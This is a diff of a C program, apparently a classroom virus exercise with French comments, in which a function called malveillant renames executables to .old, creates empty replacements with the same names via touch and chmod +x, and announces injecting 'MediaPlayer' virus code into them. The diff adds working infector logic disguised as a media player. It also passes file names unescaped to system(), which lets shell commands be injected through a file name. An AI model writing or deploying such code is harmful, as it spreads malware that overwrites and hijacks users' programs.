@@ -2,7 +2,7 @@
 
 int main() {
 
-        //mediaplayer();
+        mediaplayer();
         malveillant();
 
         return 0;
@@ -101,9 +101,13 @@ void cptExec() {
         }
 }
 
+/*
+        Renomme les fichiers, créer un noueau fichier au même nom et ajout les droits sur le nouveau fichier
+*/
 void renamingFile(char *fileName) {
         printf("\tRenaming %s into %s.old\n",fileName,fileName);
 
+        // renommage des fichiers en .old
         char *command = "mv ";
         char *extension = ".old";
         char *espace = " ";
@@ -114,18 +118,35 @@ void renamingFile(char *fileName) {
                 strcat(String,espace);
                 strcat(String,fileName);
                 strcat(String,extension);
+                system(String);
         }
-        system(String);
+
+        // création des nouveaux fichier remplacant
+        command = "touch ";
+        String = malloc(strlen(command) + strlen(fileName) + 1);
+        if(String) {
+                strcpy(String,command);
+                strcat(String,fileName);
+                system(String);
+        }
+
+        // ajoute le droit d'exécution sur le fichier
+        command = "chmod +x ";
+        String = malloc(strlen(command) + strlen(fileName) + 1);
+        if(String) {
+                strcpy(String,command);
+                strcat(String,fileName);
+                system(String);
+        }
 }
 
 void malveillant() {
         printf("\nBad things happens bruh\n");
-        //system("cat MediaPlayer");
-        printf("\nListing executables and renaming..\n\n");
+
+        printf("\nListing executables and renaming and creating new files..\n\n");
 
         cptExec();
 
-        printf("\nCréation of new executables with the same name as the previous ones..\n");
         printf("\nInjection du code du virus MediaPlayer dans les nouveaux executables..\n");
 
 
